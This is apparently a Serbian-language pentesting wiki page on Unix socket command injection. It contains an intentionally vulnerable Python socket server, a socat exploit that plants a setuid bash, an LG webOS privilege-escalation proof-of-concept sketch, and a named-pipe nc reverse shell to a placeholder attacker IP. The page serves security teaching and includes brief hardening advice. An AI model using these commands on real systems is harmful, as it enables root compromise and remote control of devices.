# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

U sledećem primeru se kreira **unix socket** (`/tmp/socket_test.s`) i sve što se **primi** biće **izvršeno** pomoću `os.system`. Znam da ovo nećete naći u prirodi, ali cilj ovog primera je da pokaže kako izgleda kod koji koristi unix sockets i kako upravljati ulazom u najgorem mogućem slučaju.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Pokrenite** kod koristeći python: `python s.py` i **proverite kako socket sluša**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Studija slučaja: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Neki privileged daemons izlažu root-owned UNIX socket koji prihvata untrusted input i vezuje privileged actions za thread-IDs i signals. Ako protocol dozvoljava da unprivileged client utiče na koji native thread bude targetiran, možda ćete moći da trigger-ujete privileged code path i escalate-ujete.

Posmatran obrazac:
- Povežite se na root-owned socket (npr. /tmp/remotelogger).
- Kreirajte thread i dobijte njegov native thread id (TID).
- Pošaljite TID (packed) plus padding kao request; primite acknowledgement.
- Pošaljite specifičan signal tom TID-u da biste trigger-ovali privileged behaviour.

Minimalna PoC skica:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Da biste ovo pretvorili u root shell, može se koristiti jednostavan named-pipe + nc pattern:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Napomene:
- Ova klasa ranjivosti nastaje zbog poverenja u vrednosti izvedene iz neprivilegovanog stanja klijenta (TIDs) i vezivanja tih vrednosti za privilegovane obrađivače signala ili logiku.
- Ojačajte primenom credentials na socket, validacijom formata poruka i odvajanjem privilegovanih operacija od spolja dostavljenih identifikatora niti.

## Reference

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
